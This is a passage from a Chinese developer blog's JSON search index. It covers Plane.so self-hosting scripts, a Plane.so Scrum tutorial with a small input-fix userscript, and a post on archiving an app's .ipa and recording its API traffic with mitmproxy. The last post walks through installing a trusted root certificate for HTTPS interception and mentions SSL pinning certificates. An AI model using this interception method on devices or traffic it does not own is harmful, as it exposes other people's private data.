EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !RC4\";# ssl_ecdh_curve secp384r1; # Requires nginx &gt;= 1.1.0# ssl_session_timeout 10m;# ssl_session_cache shared:SSL:10m;# add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";# client_max_body_size 0;# location / {# proxy_pass http://plane-app-proxy-1; # plane proxy-1 服務名稱# proxy_set_header Host $host;# proxy_set_header X-Real-IP $remote_addr;# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;# proxy_set_header X-Forwarded-Proto $scheme;# }# }# server {# listen 80;# server_name plane.zhgchg.li;# return 301 https://plane.zhgchg.li$request_uri;# } proxy_pass 輸入 Plane 網路中的 服務入口 這邊只以 HTTP 當範例，若要支援 HTTPS 可參考 自行簽名憑證 的方式。因為有多個 docker-compose.yml 需要個別啟動，再啟動 Nginx 反向代理，因此我們可以把所有啟動腳本都放到同一個 Shell Script。webServices/ 下建立 /start.sh 檔案：#!/bin/sh# 封裝啟動 Script# 先啟動 Plane..等其他服務docker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env up -d# 最後才啟動 Nginxdocker compose -f ./docker-compose.yml --env-file ./.env up -d第一次建立 Script 檔案記得先： chmod +x ./start.sh停止服務也可以建立一個， webServices/ 下建立 /stop.sh 檔案：#!/bin/sh# 封裝停止 Scriptdocker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env downdocker compose -f ./docker-compose.yml --env-file ./.env down第一次建立 Script 檔案記得先： chmod +x ./stop.sh啟動 我們封裝好 Nginx 反向代理＋Plane 服務＋其他…之後就可以直接下 ./start.sh 啟動所有服務./start.shDNS 設定架設在內網地端，需要請 IT 部門在內網 DNS 加上 plane.zhgchg.li -&gt; 伺服器 IP 位址的 DNS 紀錄。plane.zhgchg.li 伺服器 IP 位址如果你是在自己的電腦本地測試，可以在 /private/etc/hosts 檔案中加入：127.0.0.1 plane.zhgchg.liDNS 設定完成後 進入 plane.zhgchg.li 就能開啟 Plane 囉！常見問題 Nginx 啟動失敗，一直 Restarting，進入看 Log 顯示 nginx: [emerg] host not found in upstream代表 Nginx 反向代理服務找不到 Plane 服務，要檢查 http://plane-app-proxy-1 名稱是否正確、Nginx docker-compose.yml 網路設定是否正確 出現 502 Bad Gateway啟動順序有誤(確保 Nginx 反向代理是最後啟動)或 Plane 進程有重啟過，嘗試重新啟動應該就可以了。 出現 Nginx 默認首頁 welcome to nginx! ，使用反向代理你將不再能使用原本 IP:80 方式進入 Plane，要使用網址 網址無法解析、找不到主機，請確認 DNS 網路設定是否正常。⚠️⚠️資安問題⚠️⚠️因 Plane 專案正在開發中並且是開源專案，尚不確定有無嚴重系統漏洞，最嚴重可能會變成入侵入口；因此不建議將 Plane.so Self-Hosted 建立在公開網路上，可多加一層安全驗證(Tunnel or 憑證 or VPN)通過才能連入；架設在內網也最好隔離開來。開發中專案難免有 Bug、體驗、安全問題，請大家多給 Plane.so 團隊一點耐心；有任何問題也歡迎到下方回報： 問題回報： https://github.com/makeplane/plane/issues 官方 Discord： https://discord.com/invite/A92xrEGCge完整 Self-Hosted Repo 範例下載Plane.so 使用與 Scurm 流程結合教學 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,056 Total Views Last Statistics Date: 2025-08-15 | 1,035 Views on Medium." }, { "title": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具", "url": "/posts/zrealm-dev/plane-so-%E5%85%8D%E8%B2%BB%E9%96%8B%E6%BA%90%E4%B8%94%E6%94%AF%E6%8F%B4-self-hosted-%E7%9A%84%E9%A1%9E-asana-jira-%E5%B0%88%E6%A1%88%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7-9d0f23784359/", "categories": "ZRealm Dev.", "tags": "ios-app-development, asana, scrum, project-management, open-source", "date": "2024-05-25 16:28:02 +0800", "snippet": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具Plane.so 專案管理工具使用介紹與搭配 Scurm 流程的使用️⚠️️️️⚠️️️️⚠️️️️2025 Update️ ⚠️️️️⚠️️️️⚠️️️️已不推薦使用 Plane.so，原因是 Plane.so 初期依靠開源專案與支援自架崛起，但在後續的版本終將許多功能都放入付費計畫中，即使是...", "content": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具Plane.so 專案管理工具使用介紹與搭配 Scurm 流程的使用️⚠️️️️⚠️️️️⚠️️️️2025 Update️ ⚠️️️️⚠️️️️⚠️️️️已不推薦使用 Plane.so，原因是 Plane.so 初期依靠開源專案與支援自架崛起，但在後續的版本終將許多功能都放入付費計畫中，即使是自架也需要購買憑證才能開通功能，就算是自架也會有使用者人數限制，已不符合當初的想像；另外就是收費計劃非常混亂，有終身、Pro、Business…難保就算花錢購買，會不會又推出新的方案，新功能又只在新方案之中。背景Asana在前司 Pinkoi 時第一次體會到 Asana 專案管理工具的強大，不管是內部專案管理或是跨團隊之間的協作，Asana 都能在其中擔任解耦人與人、人與事之間依賴的角色，提升協作效率。在前司從產品團隊到經營、商業團隊 (如：HRBP, Finance, Marketing, BD…) 所有團隊都會有一個團隊公開的 Project 作為跨團隊間的單一協作入口，當其他團隊需要協助時，可以直接開一張 Task (也可以從 Template Task) 到該 Project (通常都會有一個 Need Help! Section)，團隊內部收到 Task 後會接手進行安排。與經營團隊的跨團隊協作，如採購、招募流程，可以直接開 Task 並透過他追蹤進度；與商業團隊的協作如行銷活動規劃、需要工程協助修改的任務…等等。如果沒有 Asana 或類似的專案管理工具： 任何事物我們都需要與對方團隊進行直接溝通，P0 事務直接溝通是最有效的，但日常上應該有 90% 都不會是 P0 事務，不管大小事都直接人對人溝通很沒有效率且會 打斷對方工作心流 任務執行不透明，只有對談雙方知道狀況進度，如果是多方任務就只能靠溝通反覆確認進度；另外，主管也難掌握大家手上任務進行合理安排 任務的安排，日常上我們會收到很多 Task，優先度有高有低、方向也很多面，有工具在才能搜集、歸類同類型的問題，日後一起挑出來解決；日常工作安排也較容易挑出重要的任務 任務的交接，有工具紀錄任務細節、執行狀況，若遇到需要其他人協助時，可以快速從 Task 上的內容接手任務回到專案管理上，Asana 提供彈性、多維度、自動化的專案管理工具，可以依照需求自行組合使用。 Asana 的使用方式有很多，以下僅舉幾個使用案例，建議先確定需求再找相關 Asana 範例套用使用。 Asana 台灣代理商亦有提供完整的教育訓練，有興趣可以與他們聯絡。 (本篇無業配)範例1團隊專案 Project To Do: 這週、下週將要開始的任務 In Progress: 正在執行的項目 Review: 已完成，等待 Sprint Review Backlog: 任務池子，每週從中挑出 Task 安排執行團隊 Scrum Project除了團隊主 Project 外會再開一個 Scrum Project 安排(Asana Task 可同時加入多個 Project)、回顧每個 Sprint 任務執行內容。範例2範例二是使用 Section 作為 Sprint 區分，每週會建立一個 Section 將任務拖入，另外透過 Label 標記其他狀態。回到現實如同前述，以上是前司 Pinkoi 有 Asana 專案管理工具的場景；這幾個月回到沒有專案管理工具的環境，可以說是更感覺到工具對工作效率的重要性。目前環境沒有較現代的專案管理工具，基於採購(需控制支出)、內控問題(純內網)與個資稽核限制(必須地端)，因此無法直接導入使用 Asana。基於以上環境限制，只能先朝開源且支援 Self-Hosted 的專案管理工具著手，找到的解決方案不外乎就是：Redmine, OpenProject, Taiga…嘗試了幾套效果都不如預期，功能缺少、UI/UX 不友善；直到無意間找到一套 2023/01 才新推出的 Plane.so 專案管理工具。順便推薦一下這個網站，收錄很多可以支援 Self-Hosted 的服務：awesome-selfhosted A list of Free Software network services and web applications which can be hosted on your own servers awesome-selfhosted.net 說這麼多，以下正文開始。目錄本文分為： Plane.so 介紹 Plane.so 操作教學 Plane.so x Scrum 工作流程範例 附錄可依照需求查看，Docker Self-Hosted 自架教學請參考下篇「 Plane.so Docker Self-Hosted 自架紀錄 」。Plan.so 介紹簡介Plane - The open source project management tool Open-source project management tool to manage issues, sprints, and product roadmaps with peace of mind. plane.soPlane 成立於 2022 年，是來自 美國德拉瓦州 和 印度 的新創公司，目前觀察 Linkedin 與 Github 活動大部分的開發人員都在印度；該公司目前已募集到 400 萬美元的啟動天使資金 (由 OSS Capital 投資)。How Plane, an open-source alternative to Jira, got to the #1 in project management on GitHub in… Our lessons from 0 to 20K GitHub stars in a year plane.so目前 Plane 佔據 Github 專案管理類別第一名 ，使用 AGPL-3.0 license 開源，第一版 2023/01 推出，目前扔持續在開發階段，尚未提供正式 Relase 版。 請注意： ⚠️ 開源 不等於 免費 ⚠️ ， 如同 Github 與 Gitlab，專案管理工具有很多類似 Github 的產品，例如 Asana, Jira, Clickup 但是還沒有一套足夠好用足以匹敵的 Gitlab 開源產品，而 Plane 的目標就是成為專案管理工具類的 Gitlab。 約保持兩到三週更新一次開發版本，部分調整可能差距較大或仍有資安問題。 暫時不支援多語系(中文) 支援 Self-Hosted 目前官方不提供從 Cloud 匯出，匯入到 Self-Hosted，只能自己透過 API 串接實現，因此若有考慮 Self-Hosted 地端使用，建議只把 Cloud 當成試用版使用 macOS App, iOS App, Android App 也正如火如荼開發中。Plane Product Roadmap 可參考 官網資訊 ：https://sites.plane.so/plane/459cfcdf-dc9c-49a6-9d4b-a89f91440189/?board=kanban開源 Repo：方案Plane 提供雲端版本服務，$0 美金起，Pro 提供更多框架與整合、自動化功能。另外官方正在推廣 $799 早期終身方案，有興趣付費支持的團隊可以直接參考此方 案：Community Edition (官方簡稱 CE 版)， Self-Hosted 版本，同樣是 $0 美金起， 如果要使用進階功能依然要購買 Pro 但可以支援 Self-Hosted 。框架Plane.so 不同於 Asana 的多維度彈性但 Plane 由以下框架組成，供專案管理使用： Issues：同 Asana Task，任何工作都開成 Issue 再安排處理或是當成留紀錄。 Cycles：類似 Sprint，一個迭代的時間週期或是版本，每個 Issue 只能存在在一個 Cycle。 Modules：專案、模組、分類功能，每個 Issue 可加入多個 Modules。 Layouts &amp; Views：可以使用 甘特圖、行事曆、看板、列表、Sheet 模式檢視 Issues，也可以將篩選條件、顯示方式儲存為 View 方便快速檢視。 Inbox：Issue Proposed 流程，可建立提案 Issue，審核通過才會真的建立 Issue 到專案中執行，不通過則直接 Pages：簡易文檔功能，可以記錄一些工作、產品事項。 Drive：類似 Google Drive 團隊檔案功能。目前免費版、CE (Self-Hosted)版 均無此功能。Plane.so 操作教學我們可以快速、免費直接的開始使用 Plane Cloud 版本：Workspace 首次進入 Plane.so 會需要我們建立首個 Workspace Workspace 同 Asana 工作區域，一隻帳號可以加入多個 Workspaces 如果是小型公司跨團隊使用可以在同個 Workspace 如果是大公司跨團隊，Plane 沒有如 Asana 的 Team 功能、Project 分組功能；在同個 Workspace 會導致 Projects 混亂，建議直接改成用 Workspace 區分團隊創建完成後可在 Workspace 下拉選單上切換不同 Workspace，也可由此進入 Workspace Settings:設定有： General Workspace 大頭貼、名稱、網址 Billing and plans 付費資訊、升級方案 Integrations 第三方整合，目前免費版僅提供 Github, Slack 整合 Imports 匯入功能，目前僅提供 Jira, Github Project 匯入 Exports 匯出功能，目前僅提供 csv, excel, json 格式匯出 Webhooks API tokens，自行串接 API比較重要的設定是 Members，我們需要邀請團隊成員加入 Workspace:身份別： Guest/Viewer 目前功能上無太大區別，僅能檢視 Issue、Comment、Emoji；如果是不同組織信箱外的外部使用者則為 Guest，同個組織則為 Viewer Member 可操作所有功能 Admin 可進入 SettingsHome 首頁 Home 整個 Workspace 所有 Projects, 成員狀態 Anaytics 所有成員, Issues 分析 Projects 所有 Projects All Issues 所有 Projects 的 Issues Active Cycles 所有 Projects 當前 Cycle 狀態 Notifications Issues 通知Projects進入 Projects 查看所有公開、已加入的 Projects: Project 名稱、簡介、封面圖、前綴 (Issue Alias e.g. APP-1 ) Project 權限：Public 所有加入 Workspace 的成員都能查看、加入；Private 只有受邀的成員能加入 Lead：Project 主要負責人Project 右上角「…」可進行： Add to favorites， Pin 到 我的最愛 (Your Projects 上方) Publish 產生公開對外連結，如同官方 Roadmap Project Draft Issues 查看已儲存的草稿 Issues Archives 查看被封存的 Issues其他設定： General：專案一般設定 Members：專案成員、專案權限 States：專案 Issue 狀態 (後面會介紹) Labels：專案 Labels 管理 Features：可控制要啟用哪些功能(預設不啟用 Inbox 功能) Estimates：專案估時欄位設定 (後面會介紹) Integrations：第三方整合 (Workspace 要先啟用) Automations：目前免費版僅支援超過 X 時間就自動把 Closed Issues 封存、超過 X 時間自動 Close 未完成的 IssuesIssues 進入後可由左方 Projects 建立 Project 不同於 Asana，Plane 的 Issue 只能加入一個 Project 右上角可切換顯示方式 預設會展開所有 Sub-Issues，如果覺得很雜可以到 Display -&gt; 取消 Show sub-Issues點擊「Create Issue」開始建立 Issue： 可儲存成草稿 Issues 支援文字樣式、Code Block 支援 Markdown 支援文繞圖，可直接拖曳圖片上傳 支援多位 Assignees (這點比 Asana 方便，Asana 只支援一個 Task 一位 Assignee) 選擇 Priority，不同 Priority 有不同高亮樣式 (目前無法客製化 Priority) 選擇 Modules，可以加入多個 Modules，例如： 登入優化 , App …(設定稍後介紹) 選擇 Cycle，要在哪個 Sprint 做，只能選一個，例如： W22 , S22 , 2024–05 …(設定稍後介紹) 目前不支援自訂 Issue Property 選擇 Add parent，將此 Issue 作為 Sub-Issue 加入到 Parent Issue 選擇 Labels (a.k.a Tag 功能) 選擇 Start Date, Due Date… (目前不支援到準確時間、不支援 Repeated Issue) 選擇 Estimate (a.k.a Scrum story point 或預計投入的資源)，Estimate 可在 Settings 中調整、新增；不過目前限制只能啟用一個 Estimate 欄位並且 Estimate Value 只能設定 6 個。(官方 Roadmap 寫 2024Q2 會改進此功能) 選擇 Issue State，State 可在 Settings 中調整、新增：使用 AI 建立 Issue 內容： 可以點擊建立旁邊的 AI 按鈕輸入 Prompt 自動產出預設 Issue 內容，點擊 Use this response 套用到 Issue Description。Issue 創建好之後，在列表點擊會出現 Issue Preview 視窗，可以點展開進入 Issue Full-Screen 頁面：點擊展開進入 Issue Full Screen Deatil 頁： 圖片預覽，可拖移或右鍵開新視窗放大 (目前無法點擊放大) 可點擊新增 Sub-Issue (Sub-Issues 目前不支援排序、Section 功能) 新增表情符號 (目前只有 👍👎😀💥😕✈️👀 七種表情符號) 上傳附加檔案 (不限於是圖片，但是圖片目前無預覽功能，需點擊查看) 留言討論區域 (目前中文選自會自動送出，請參考文末解決方案) 可訂閱/取消訂閱此 Issue 改變通知 Relates to 可加入關聯的 Issues Blocking 可標記正在被此 Issue 阻擋執行的 Issue (目前無特殊功能) Blocked by 可標記正在阻擋此 Issue 執行的 Issue (目前無特殊功能) Duplicate of 標記重複的 Issue (目前無特殊功能) Labels 可快速標記、創建標記 Linkes 相關連結，可加入 Figam, Google Doc 之類的外部連結 刪除、封存 IssueCycle 週期 首頁會顯示當前 Cycle 與其執行狀況、燃盡圖 還有即將到來的 Cycle、已完成的 Cycle 目前需要手動建立 Cycle 例如每兩週一個 Sprint 就要建立 SXX 然後指定時間週期 Cycle 時間週期無法重複 Cycle 時間週期不能選擇過去時間 Issue 只能加入一個 Cycle 點擊進入可查看 Cycle 細節，上方可以使用不同顯示方式、Filter 查看 Issues 右方有燃盡圖、執行狀況 可依照 Assignees, Labels, States 查看 IssuesModules 模組 可以把 Modules 當成專案彙整、OKR 目標、職能分類(Design, FE, BE, App. . ) 來使用 可設定專案 Lead &amp; Members 專案進度與 Issue State 不同，多了 Planned, Paused 狀態 可設定日期範圍 點擊進入可查看 Module 細節，上方可以使用不同顯示方式、Filter 查看 Issues 右方有燃盡圖、執行狀況 可依照 Assignees, Labels, States 查看 Issues 可為 Module 加上 LinkViews 可為常用的篩選條件、檢視模式建立 View，可以直接從此快速查看。 View 上方一樣可以使用不同顯示方式、Filter 查看 IssuesPages 簡易文檔 Pages 提供所見即所得的文檔編輯器，可以很容易的撰寫文檔、插入圖片 目前暫不支援目錄、分類功能，文檔一多會很混亂 文檔權限：Public 所有 Project 成員可見、Private 僅自己可見。Notifications Issues 個人通知功能 訂閱的 Issues 之狀態、內容更改、新留言都會有通知 預設自己建立的、被 Assign 的、Lead 的專案的 Issues 都會訂閱 目前無 Slack 、第三方通知目前僅能透過 Email 通知： 從大頭貼 -&gt; Settings -&gt; Preferences -&gt; Email 可打開 Email 通知Dark Mode 從大頭貼 -&gt; Settings -&gt; Preferences -&gt; Theme 可選擇 Plane 主題官方手冊其他操作、使用細節可參考官方文件。⚠️⚠️聲明⚠️⚠️ 以上是 2024–05–25 v0.20-Dev 版的使用介紹，官方仍如火如荼開發新功能與優化使用者體驗，上述功能限制在未來都可能已改善，請以最新版的體驗為主。開發中專案難免有 Bug、體驗問題，請大家多給 Plane.so 團隊一點耐心；有任何問題也歡迎到下方回報： 問題回報： https://github.com/makeplane/plane/issues 官方 Discord： https://discord.com/invite/A92xrEGCgePlane.so x Scrum 工作流程範例架構 每個團隊有自己的 Workspace 每個團隊會有一個主要的產品 Project Projects：其他可建立如行銷廣告 Project、客服支援 Project 或與外部合作的 Project，與產品主要開發 Project 分開 Modules：建立 Function Modules (設計, 前端, 後端, App) 方便 Team Lead 追蹤、將 OKR 或專案目標建立 Module (提升轉換率、OKR-1 提升 GMV…) Cycle：依照 Sprint 週期建立 Cycle，假設是每週一個 Sprint 可建立 W12 or 照週一日期來建立 2024–05–27 因目前無法自動建立 Cycle，因此需每月或每週先建立好未來的 Cycle 有什麼工作都要開 Issue Issue 可以的話加上 Start Date &amp; Due Date、Modules、Priority 如過一個 Issue 一直在 In-Progress &amp; Cycle 中切換(一個 Cycle 做不完)，可評估是否把 Issue 拆細，方便專案管理流程 Sprint 週期：一週 Backlog：有什麼工作、發想都開 Issue，State = Backlog、 填寫 Estimate、Priority 每週一 Sprint Planning Meeting：從 Backlog 挑選 Issues 與正在執行的 Issues (To Do or In progress)、設定 Priority/Estimate，安排本次 Sprint 執行，加入到 Cycle 中 Sprint 中如果有插單執行的 Issue 也需要直接開在本週 Cycle Daily Stand-up：每日早上花 15 分鐘快速各自分享 Issue 執行狀況 Issue 準備執行、開始執行 更改狀態成 ToDo/In Progress Issue 完成更改狀態成 Done，或是多建立一個 Review State 每週五 Sprint Review Meeting：單純 Review 本週 Issues (不是 Planning 下週)，已完成的 Issue 快速回顧，並確保有填寫 Estimate 方便日後統計。 每週五盡量確保 Cycle 內所有 Issue 都是完成的， 未完成的 Issue 選擇加入下一週的 Cycle 或轉 Pending/Cancel 。 持續迭代以上流程，管理所有 Issues、Projects⚠️⚠️聲明⚠️⚠️ 以上只是工作流程範例，請注意沒有完美的流程，只有適合您團隊的流程；請參考 Plane.so 提供的架構發揮創意找到最佳的專案管理方式。附錄APIPlane.so 是很乾淨的前後分離架構，因此有很完整的 API 可以使用，從 Workspace Settings 建立 API Tokens 後就能帶入 API Request Header X-API-Key 就能使用，API Endpoint 請求方式可參考官方 API 文件 。 但因官方文件尚未完善，很多請求方式並沒有列在文件中，最快的方式就是打開瀏覽器工具查看 Network 請求，去看官方如何請求 API 的，套上自己的 Key 就能使用。Issue 評論，輸入中文時選完字就直接送出問題開了 Issue 給官方＆追了一下 Source Code，感覺修復機會蠻低的，因為一開始就沒考慮會需要選自的語言，因此直接綁定鍵盤 Enter Event 送出 Comment。Browser Extension Workaround：這邊提供一個自己寫的 Workaround JavaScript 腳本，去 Hook Enter 事件。1.首先先安裝 JavaScript 瀏覽器注入外掛：以上是 Chromium 共用的套件，其他瀏覽器也可以搜尋類似的 JavaScript Inject 注入工具。2.回到 Plane.so 上點擊擴充套件 -&gt; 點擊「+」3.將以下 JavaScript 注入到 Plane.sodocument.addEventListener('keydown', function(event) { if (event.key === 'Enter' || event.keyCode === 13) { // event.keyCode is for older browsers const focusedElement = document.activeElement; const targetButtons = focusedElement.parentElement.parentElement.parentElement.parentElement.parentElement.querySelectorAll('button[type=\"submit\"]'); if (targetButtons.length &gt; 0 &amp;&amp; targetButtons[0].textContent.trim().toLowerCase() === \"comment\") { console.log(\"HIT\"); // Focus the active element and place the cursor at the end focusedElement.focus(); if (window.getSelection) { var range = document.createRange(); var selection = window.getSelection(); range.selectNodeContents(focusedElement); range.collapse(false); selection.removeAllRanges(); selection.addRange(range); } event.stopImmediatePropagation(); } }},true); 貼上程式碼後，按「Save」儲存。回到 Plane.so (重整) 打開一個 Issue 測試 Comment 功能。 按 Enter 選字已不會自動送出了，按空白 + Shift Enter 可換行，手動點 Comment 送出評論。⚠️⚠️⚠️資安問題⚠️⚠️⚠️ 因 Plane.so 還處於開發階段產品也很新，不確定是否有安全資安問題，建議不要上傳任何敏感資料，以免服務有重大問題時造成資料外洩，或使用 Self-Hosted 自架僅供本地內網使用。Plane Self-Hosted 自架教學 Plane.so Docker Self-Hosted 自架紀錄有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,990 Total Views Last Statistics Date: 2025-08-15 | 1,974 Views on Medium." }, { "title": "App 產品進入終點站，能做什麼事緬懷？", "url": "/posts/zrealm-dev/app-%E7%94%A2%E5%93%81%E9%80%B2%E5%85%A5%E7%B5%82%E9%BB%9E%E7%AB%99-%E8%83%BD%E5%81%9A%E4%BB%80%E9%BA%BC%E4%BA%8B%E7%B7%AC%E6%87%B7-b04f4fba3cf2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, man-in-the-middle-attack, mitmproxy, python, app-development", "date": "2024-05-15 00:20:45 +0800", "snippet": "App 產品進入終點站，能做什麼事緬懷？使用 mitmproxy + apple configurator 讓 App 永遠停留在下架前的狀態前言咒術迴戰工作時間久、經手過的產品多，也開始遇到有曾經參與過的產品要進入終點站(下架)；從零到有開發一個產品如同孕育一個新生命，團隊一起努力了 3–4 個月將孩子生下來；雖然後期已交由其他保母(工程師)繼續培養，最近聽到它即將進入產品生命週期的終點還...", "content": "App 產品進入終點站，能做什麼事緬懷？使用 mitmproxy + apple configurator 讓 App 永遠停留在下架前的狀態前言咒術迴戰工作時間久、經手過的產品多，也開始遇到有曾經參與過的產品要進入終點站(下架)；從零到有開發一個產品如同孕育一個新生命，團隊一起努力了 3–4 個月將孩子生下來；雖然後期已交由其他保母(工程師)繼續培養，最近聽到它即將進入產品生命週期的終點還是有些許遺憾。 人生也是如此，我們永遠都不知道明天是太陽先升起還是意外先來臨；唯一能做的就是珍惜當下，把事情做好。緬懷凡走過必留下痕跡，我們希望能在產品進入終點站之前做些什麼，讓大家還有機會回憶也讓它至少留下存在過的證明；以下方式都需要 App 還在線上，如果已經下架就真的只剩回憶了。非技術方式 — 錄影除了直接用 iPhone 內建的螢幕錄影功能 之外，我們也可以使用 QuickTime Player 將手機接上 Mac 使用電腦進行錄影、匯出影片。 在 Mac 上打開 QuickTime Player App2. 左上角工具列選擇「檔案」-&gt;「新增影片錄製」3. 跳出錄影介面後點擊 🔴 旁的「v」，螢幕與揚聲器選擇您接上的手機4. 此時錄影介面就會出現手機畫面點擊「🔴」開始錄影，回到手機上操作要錄影的內容。錄影中會顯示當前影片大小，欲結束錄影再按一次「🔴」即可停止。可以透過 QuickTime Player 工具列簡單的裁剪影片，最後按下「Command」+「s」匯出儲存影片到指定位置，即完成錄影留念。影片留念的好處是未來回憶比圖片更容易串連起來，錄的越深就紀錄的越仔細，若要將更別畫面轉成圖片也可以直接截圖，很方便。技術方式App 技術備份可分為兩個方向；「骨」App 本身其實只是個骨架、「肉」由 API Response Data 組成才是 App 內容資料的核心。 骨會隨著 App 從 App Store 商城下架而消失。 肉會隨著 API 主機、伺服器關閉而消失。因此我們也分成備份骨跟肉兩個技術方式。聲明 本文僅為技術研究分享，不鼓勵利用任何技術進行非法、侵權行為。[骨] 備份 .ipa App 安裝檔App 在商城下架後已下載 App 的手機只要不主動刪除 App，就會一直存在在該手機上，換手機用轉移的方式也會一併轉移過去。但如果我們不小心刪除該 App 或是換手機沒轉移，那就真的永遠跟他說再見了；此時如果有手動備份商城的 .ipa 檔案就能再次續命。很久以前 逆向工程的文章 有提到過，但這次只需單純備份 .ipa 檔案不需敲殼，全部都是使用 Apple 官方提供的工具完成。1.安裝 Apple Configurator 2首先去 Mac App Store 下載安裝「 Apple Configurator 2 」2. 將 iPhone 接上 Mac 並點擊信任電腦接上成功後就會出現 iPhone 的主畫面。3. 確認你的手機已安裝欲備份 .ipa 檔案的 App我們需要在 Apple Configurator 2 卡出取代畫面，才能取得下載到暫存中的 .ipa 檔案，因此我們要先確保手機上有安裝目標 App。4. 回到 Mac 上的 Apple Configurator 2點兩下上面顯示的 iPhone 主畫面進入資訊頁。切換到「App」-&gt; 右上角「+ 加入」-&gt;「App」完成 App Store 帳號登入後可以取得您曾經購買過的 App 列表。搜尋找到欲備份的目標 App，選擇後點「加入」。此時會出現等待視窗，正在 XXX 上加入 App、正在下載「XXX」。5. 提取 .ipa 檔案 放著等他下載完成後，會跳出詢問是否要取代現有已安裝 App 視窗。 此時不要按任何動作。此時不要按任何動作。此時不要按任何動作。我們打開一個 Finder：左上角工具列選擇「前往」-&gt; 「前往檔案夾」貼上以下路徑：~/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps就可以找到下載下來正準備要安裝的目標 App .ipa 檔案：將其複製出來即可完成 App .ipa 檔案備份。完成檔案複製後再回去 Apple Configurator 2 點擊停止，終止操作。[骨] 還原 .ipa App 安裝檔一樣是將欲還原 App 的手機接上 Mac 並打開 Apple Configurator 2，進入 App 加入介面。還原的話要選擇左下角「從我的 Mac 選擇…」選擇備份的 App .ipa 檔案，按「加入」。等待傳送、安裝完成，回到手機上就能重新打開 App，復活成功！[肉] 備份最後的 API Response Data這邊會運用到之前在 App End-to-End Testing Local Snapshot API Mock Server 文章(細節原理可參考) 中所使用到的方式跟當時弄的開源專案：同之前用錄製 API Request &amp; Response 來跑 E2E Testing 的技術，我們也可以用它來紀錄 App 下架、停機前最後的 API Request &amp; Response Data。1. 安裝 mitmproxybrew install mitmproxymitmproxy 是一套開源的中間人攻擊，網路請求嗅探工具。如果你不熟悉 Mitmproxy 中間人攻擊的工作原理可先參考我之前的文章：「 APP有用HTTPS傳輸，但資料還是被偷了。 」或 Mimproxy 官方文件 。如果是用在純網路請求嗅探，用不習慣 mimproxy 介面也可以改用「 Proxyman 」可參考之前 另一篇文章 的用法。2. 完成 mitmproxy 憑證設定 針對 HTTPS 加密連線我們需要使用根憑證抽換進行中間人攻擊，因此第一次使用須先完成手機端根憑證下載與啟用。 *如果您的 App &amp; API Server 有實作 SSL Pinning 也需要將 Pinning 憑證加入到 mitmproxy。 首先確保 iPhone 手機與 Mac 電腦是連接在相同的網路環境 若無 WiFi 電腦連接實體網路，也可以 打開 Mac 的 WiFi 分享功能 讓手機連到 Mac 的網路在 Terminal 啟動 mitmproxy or mitmweb (Web GUI 版)。mitmproxy看到這畫面代表 mitmproxy 服務已啟動，目前沒有流量進來所以是空的，掛在這個畫面不要關閉 Terminal。 到 Mac 網路設定查看 Mac 的 IP 位址回到手機 WiFi 設定點擊「i」進入詳細設定，找到最下方「設定代理伺服器」： 伺服器輸入 Mac 電腦的 IP 位址 連接埠輸入 8080 儲存在手機上打開 Safari 輸入： http://mitm.it/如果出現：If you can see this, traffic is not passing through mitmproxy.代表手機的網路代理伺服器沒有設定成功或是 Mac 上沒啟動 mitmproxy 。正常情況會出現： 此時只有 HTTP 流量能被嗅探，HTTPS 流量會報錯，我們繼續往下設定。代表連接成功，我們找到 iOS 區塊點擊「Get mimproxy-ca-cert.pem」 點擊「允許」下載完成後進入到手機的設定，會出現「已下載描述檔」點擊進入。 點擊進入，右上角「安裝」，輸入手機密碼完成安裝。回到設定 -&gt; 「一般」-&gt;「關於本機」-&gt; 最下方「憑證信任設定」-&gt; 啟用「mitmproxy」。 「繼續」完成啟用。至此我們就完成中間人攻擊所有的前置準備工作。 要記得當前你手機所有的流量都會經過代理從你的 Mac 電腦出去， 操作完畢記得回到手機上的網路設定把代理伺服器設定關掉 ，否則手機網路 WiFi 會全部連不上對外網路。回到 Terminal mitmproxy，一邊操做手機上的 App 就能看到所有被捕捉的 API 請求紀錄。每個請求都能進入查看詳細 Request &amp; Response 內容：以上是 mitmproxy 基礎設定與實際工作。3. 嗅探、了解 API 架構再來就要透過 mitmproxy 的 mitmdump 服務結合我之前開發的 mitmproxy-rodo addons 錄製請求和回放請求。 我的實現原理 是將 Request 請求參數計算成 Hash 值，在回放時再次將請求拿去計算 Hash 如果在本地有找到相同 Hash 值的備份 Response 則返回，如果有多個相同 Hash 值的請求會按照順序儲存＆回放。我們可以先透過以上方法嗅探 App 的 API (或使用 Proxyman )，觀察有哪些欄位跟哪些欄位可能會影響 Hash Mapping，可以將其記錄下來，在後續設定排除， 例如有的 API 固定會帶 ?ts 這參數不影響回傳內容，但會影響 Hash 值計算導致無法找到本地的備份，我們就需要挑出來在後面的設定中排除掉 。4.設定 mitmproxy-rodo :使用我寫好的錄製、回放開源 Script。 細節參數設定請參考該開源專案的說明。git clone git@github.com:ZhgChgLi/mitmproxy-rodo.gitcd mitmproxy-rodo將上一步驟 3. 挑出來的參數填入到 config.json 設定檔案中：{ \"ignored\": { \"*\": { \"*\": { \"*\": { \"iterable\": false, \"enables\": [ \"query\", \"formData\" ], \"rules\": { \"query\": { \"parameters\": [ \"ts\", 